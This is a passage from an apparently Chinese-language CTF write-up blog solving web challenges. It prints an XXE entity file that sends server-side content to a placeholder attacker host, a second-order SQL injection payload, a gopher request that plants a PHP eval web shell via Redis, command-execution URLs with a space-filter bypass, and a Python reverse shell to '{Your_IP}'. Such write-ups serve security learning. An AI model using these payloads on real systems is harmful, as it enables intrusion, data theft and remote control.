                                <span class="token variable">$hash</span><span class="token operator">=</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select filehash from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token variable">$new_filename</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$hash</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
                                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$new_filename</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Your file &quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; upload successful.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Not upload file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>show.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">&quot;view&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;REMOTE_ADDR&quot;</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Forbidden.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$file_info</span><span class="token operator">=</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$file_name</span><span class="token operator">=</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">/</span>
			<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;file code: &quot;</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$new_sig</span><span class="token operator">=</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;update file set sig='&quot;</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$new_sig</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;' where id=&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; and sig='&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;br&gt;new sig:&quot;</span><span class="token punctuation">.</span><span class="token variable">$new_sig</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Null filename&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在function.php中对post的<code>sig</code>进行了转义，但是在show.php进行<code>update</code>的时候却没有进行转义造成了二次注入：</p> <p><img src="https://i.loli.net/2020/11/16/jZAdYVnwOSJbhLa.png" alt="image-20201116210254571"></p> <p>所以注入点就在文件上传的时候的数据包的<code>sig</code>处，function.php中的函数在submit.php中被调用，所以在submit.php上传文件的时候抓包修改恶意的sig数据，然后在show.php中拿flag，要注意的一点是show.php只允许localhost访问，所以还需要利用XXE进行SSRF：</p> <p>evil.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=4.php&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY <span class="token entity" title="&amp;#37;">&amp;#37;</span> send SYSTEM 'http://{IP}/xxe/test.php?file=%file;'&gt;&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment">-- sig</span>
<span class="token comment">-- 多余的就不写了，直接写最后一步吧</span>

<span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> REVERSE<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
<span class="token comment">-- to hex</span>
<span class="token number">0x2720616E64206578747261637476616C756528312C636F6E63617428277E272C2873656C656374205245564552534528666C6167292066726F6D20666C616729292923</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="https://i.loli.net/2020/11/16/lPg6BG9Fx5W7TEN.png" alt="image-20201116211133507"></p> <p>注意上传完之后需要再次请求一下远程的xml文件：</p> <p><img src="https://i.loli.net/2020/11/16/jK2xqAMLT7tfUS5.png" alt="image-20201116211259552"></p> <p><img src="https://i.loli.net/2020/11/16/DLXanuCxbo62pQw.png" alt="image-20201116211205185"></p> <h2 id="ssrf"><a href="#ssrf" class="header-anchor">#</a> SSRF</h2> <h3 id="ez三剑客-ezweb"><a href="#ez三剑客-ezweb" class="header-anchor">#</a> EZ三剑客-EzWeb</h3> <p><strong>考点：利用 gopher协议攻击redis端口</strong></p> <p>进入题目环境，题目要求输入一个url,感觉是很明显的SSRF，右键查看源代码，发现提示</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812224358.png" alt="image-20200812224322507"></p> <p>传入secret参数，给了一个IP地址：173.49.220.9</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812224449.png" alt="image-20200812224449287"></p> <p>提交url  <em>http://173.49.220.9</em>  出现了一个一模一样的页面</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812225108.png" alt="image-20200812224610989" style="zoom:50%;"> <p>做一波内网主机探测，发现173.49.220.10这台主机上貌似有东西</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812225055.png" alt="image-20200812225055412" style="zoom:67%;"> <p>根据提示，爆破一下端口，发现了6379端口</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230930.png" alt="image-20200812225609816" style="zoom:67%;"> <p>6379是Redis的默认端口，利用gopher协议直接写shell试一下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>gopher://173.49.220.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>写入shell之后再提交 <em>http://173.49.220.10/shell.php?cmd=system('ls${IFS}/');</em>   (需要绕过一下空格)</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230526.png" alt="image-20200812230512887"></p> <p>尝试读取flag</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://173.49.220.10/shell.php?cmd=system('cat${IFS}/flag');
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230642.png" alt="image-20200812230605779"></p> <h3 id="网鼎杯-2020-白虎组-picdown"><a href="#网鼎杯-2020-白虎组-picdown" class="header-anchor">#</a> [网鼎杯 2020 白虎组]PicDown</h3> <p><strong>考点：</strong></p> <ul><li><strong>简单的SSRF</strong></li> <li><strong>linux系统知识</strong></li> <li><strong>Python反弹shell</strong></li></ul> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>虽然把这道题目放到了SSRF分类，但是严格来说，对于这道题目SSRF只能算是一个起点，真正重要的是对于Linux下的某些知识的熟悉程度。</p></div> <p>进入题目环境拿到一个输入框，并且发现提交的参数是<code>url</code>：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003220636.png" alt="image-20201003220627131"></p> <p>感觉存在SSRF，看路由感觉像flask，读一下文件试一试：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003223924.png" alt="image-20201003220859193"></p> <p>本来打算用<code>local_file：//</code>来读取文件，结果发现没反应，后来想到，在python3环境下可以省略该协议：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003221034.png" alt="image-20201003221034774"></p> <p>读一下<code>app.py</code>，拿到了flask的源码：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003221117.png" alt="image-20201003221117082"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">&quot;/tmp/secret.txt&quot;</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">&quot;HACK ERROR!&quot;</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> <span class="token string">&quot;SOMETHING WRONG!&quot;</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;shell&quot;</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">&quot;ok&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">&quot;Wrong Key!&quot;</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>简单阅读源码后，可以得到以下两点信息：</p> <ul><li><code>/page</code>路由下存在<code>urllib.urlopen(url)</code>语句，且<code>url</code>参数是我们可控的，这是SSRF产生的原因。</li> <li><code>/no_one_know_the_manager</code>路由下会拿<code>key</code>和<code>SECRET_KEY</code>进行比较，如果正确则会执行传入的<code>shell</code>，且执行的命令是没有回显的。</li></ul> <p>想要执行命令，就要得到<code>SECRET_KEY</code>，在源码的一开始就告诉了它在哪里：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>SECRET_FILE <span class="token operator">=</span> <span class="token string">&quot;/tmp/secret.txt&quot;</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>通过打开<code>/tmp/secret.txt</code>文件，然后读取<code>SECRET_KEY</code>，最后删掉该文件。</p> <p>关于这题目的考点，在<code>[V&amp;N2020 公开赛]CHECKIN</code>中就已经碰到过了：<strong>在Linux系统下，如果打开了一个文件没有关闭的话，即使将文件删除，也可以在<code>/proc/[pid]/fd/</code>这个目录下看到该文件的内容。</strong></p> <p>结合之前存在的SSRF，我们可以通过查看上面说到的目录中存在的符号链接来查看<code>secret.txt</code>文件的内容，由于不知道当前flask应用的<code>pid</code>，可以使用<code>/proc/self/</code>来代替（这里涉及到了一些Linux的知识，可参考：<a href="https://blog.csdn.net/psvoldemort/article/details/7322026" target="_blank" rel="noopener noreferrer">这篇文章<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>），由于Linux下的文件描述符都是非负整形，所以我们可以爆破一下<code>/proc/self/fd/</code>目录下的文件描述符：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003222236.png" alt="image-20201003222236479"></p> <p>在<code>/proc/self/fd/3</code>中发现了<code>SECRET_KEY</code>，接着传入参数，因为执行的命令没有回显，所以直接反弹一个shell：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003222617.png" alt="image-20201003222617510"></p> <p>payload如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">302424f1</span><span class="token operator">-</span>e714<span class="token operator">-</span><span class="token number">44a6</span><span class="token operator">-</span>b67d<span class="token operator">-</span>a8d749c7e078<span class="token punctuation">.</span>node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn<span class="token operator">/</span>no_one_know_the_manager?key<span class="token operator">=</span>x6IdiBiuJg0dmEowLErZgcr8yAyt2Zp5oeY4XN0xQEQ<span class="token operator">=</span><span class="token operator">&amp;</span>shell<span class="token operator">=</span>python3 <span class="token operator">-</span>c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{Your_IP}',2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="其他"><a href="#其他" class="header-anchor">#</a> 其他</h2> <h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="header-anchor">#</a> 枯燥的抽奖</h3> <p><strong>考点：PHP伪随机数爆破</strong></p> <p>关于随机数的参考文章：<a href="https://blog.csdn.net/qq_45521281/article/details/107302795" target="_blank" rel="noopener noreferrer">这里<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>，已经讲的相当详细了。</p> <p>进入题目F12发现提示check.php，下面是源码</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>// check.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Content-Type: text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
